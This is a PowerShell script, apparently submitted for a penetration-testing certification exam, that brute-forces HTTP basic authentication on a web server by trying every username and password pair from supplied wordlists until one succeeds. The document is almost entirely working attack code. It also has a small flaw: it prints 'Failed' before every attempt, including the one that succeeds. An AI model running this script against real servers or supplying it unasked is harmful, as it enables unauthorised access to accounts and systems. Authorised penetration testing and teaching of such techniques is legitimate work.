function BruteBasicAuthentication {

<#

.SYNOPSIS
PowerShell cmdlet for brute forcing basic authentication.

.DESCRIPTION
This script is developed to perform brute force attack on any web server having basic authentication.

.PARAMETER Hostname
The hostname or IP address of the web server.

.PARAMETER Port
The port the webserver is running on to brute. Default is 80, can change it with the -Port switch.

.PARAMETER Path
The Path of the page that is having basic authentication to perform bruteforce attack against.

.PARAMETER UserList
The list of usernames to use in the brute force

.PARAMETER PassList
The list of passwords to use in the brute force

.EXAMPLE
PS C:\> BruteBasicAuthentication -Hostname http:\\example.com -Path /demos/php-auth/index.php -UserList .\users.txt -PassList .\pass.txt 

.LINK
https://github.com/samratashok/nishang/blob/master/Scan/Invoke-BruteForce.ps1

.NOTES
This script has been created for completing the requirements of the SecurityTube PowerShell for Penetration Testers Certification Exam
http://www.securitytube-training.com/online-courses/powershell-for-pentesters/
Student ID: PSP-3222


#>

    [CmdletBinding()] 
    param (
        # The Hostname or IP of the server to brutfore
        [Parameter(Mandatory = $true, ValueFromPipeline=$true)]
        [string]
        $Hostname,

        # The port number of which the web authetication is running on
        [Parameter(Mandatory=$false)]
        [int]
        $Port = 80,

        # The Path of the Authentication page 
        [Parameter(Mandatory= $false)]
        [string]
        $Path,
        
        # usernames wordlist to use in the bruteForce 
        [Parameter(Mandatory=$true)]
        [string]
        $UserList,

        # passwords wordlist to use in the bruteforce
        [Parameter(Mandatory=$true)]
        [String]
        $PassList
        
    )
    # The full url of the basic authentication
    $url = $Hostname + ":" + $Port + $Path
    # Adding the usernames and passwords in an array to use it for brute force
    $usernames = Get-Content $UserList
    $passwords = Get-Content $PassList 
    
    # Doing loop over all usernames in the UserList
    :BruteLoop foreach ($user in $usernames )
    {
        foreach ($pass in $passwords) 
        {
            #Creating Web Client object
            $wc = New-Object Net.WebClient
            $SecurePassword =  ConvertTo-SecureString -AsPlainText -String $pass -Force
            $Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList $user, $SecurePassword
            $wc.Credentials = $Credential
            try {
                # Testing credentials
                Write-Host "Failed $user::$pass" -ForegroundColor Red
                $page = $wc.DownloadString($url) 

                # if success 
                Write-Host "Credentials found! $user : $pass  " -ForegroundColor Green
                break BruteLoop

            }
            catch {
                # no luck 
                Write-Verbose "invalid Credentials"
                
            }
        }
    }


}